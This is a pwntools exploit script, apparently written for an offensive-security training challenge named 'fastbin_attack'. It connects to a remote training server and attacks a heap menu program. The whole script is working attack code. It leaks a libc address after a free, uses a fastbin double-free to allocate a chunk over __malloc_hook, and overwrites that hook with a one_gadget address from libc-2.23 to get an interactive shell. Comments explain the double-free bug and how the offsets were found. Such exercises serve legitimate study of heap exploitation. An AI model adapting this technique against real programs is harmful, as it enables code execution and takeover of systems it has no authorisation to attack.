from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

if "REMOTE" not in args:
    r = process("./fastbin_attack")
    gdb.attach(r, """
    # b 
    c
    """)
    input("wait")
else:
    r = remote("bin.training.offdef.it", 10101)

def alloc(size):
    r.recvuntil("> ")
    r.sendline("1")
    r.recvuntil("Size: ")
    r.sendline("%d" % size)
    r.recvuntil("index ")
    index = int(r.recvuntil("!")[:-1]) #I am removing ! from the received string
    return index

def write(index, data):
    r.recvuntil("> ")
    r.sendline("3")
    r.recvuntil("Index: ")
    r.sendline("%d" % index)
    r.recvuntil("Content: ")
    r.send(data)
    r.recvuntil("Done!")

def read(index):
    r.recvuntil("> ")
    r.sendline("2")
    r.recvuntil("Index: ")
    r.sendline("%d" % index)
    data = r.recvuntil("\nOptions:")[:-len("\nOptions:")] #Missing ' '?
    return data

def free(index):
    r.recvuntil("> ")
    r.sendline("4")
    r.recvuntil("Index: ")
    r.sendline("%d" % index)

#Polino:
""" a = alloc(0x30)
b = alloc(0x30)
free(a)
free(b)
free(a) #Vulnerability -> a is freed 2 times, creating a loop. The code doesn't check if already freed.
#Now we have a loop

a = alloc(0x30)
write(a, b"A"*0x30)
alloc(0x30)
alloc(0x30)
alloc(0x30) #Crash, at mov r8, [...] """

LIBC_OFFSET = 0x3c4b78 #VMMAP -> get base of libc, calculate offset (ipython)
MALLOC_HOOK_OFFSET = 0x3c4b10
LIBC = ELF("./libc-2.23.so")

#Leak libc 
alloc(0x100)
alloc(0x20)
free(0)
leak = read(0)
#libc_base = u64(leak. ljust(8, b"\x00")) - LIBC_OFFSET
LIBC.address = u64(leak.ljust(8, b"\x00")) - LIBC_OFFSET
print(hex(LIBC.address))

#fastbinattack
alloc(0x60) #index 2
alloc(0x60) #Index 3
free(2)
free(3)
free(2)
alloc(0x60) #Index 4
write(4, p64(LIBC.symbols["__malloc_hook"] - 0x23))
alloc(0x60) #Index 5
alloc(0x60) #Index 6

#Overwrite malloc_hook
alloc(0x60) #Index 7
write(7, b"A"*0x13 + p64(LIBC.address + 0xf1247)) # magic number found with one_gadget libc-2.23.so
                                             # sudo apt install ruby-rubygems
                                             # sudo gem install one_gadget

# pwndgb> p &__malloc_hook
# pwndgb> p &__free_hook

r.interactive()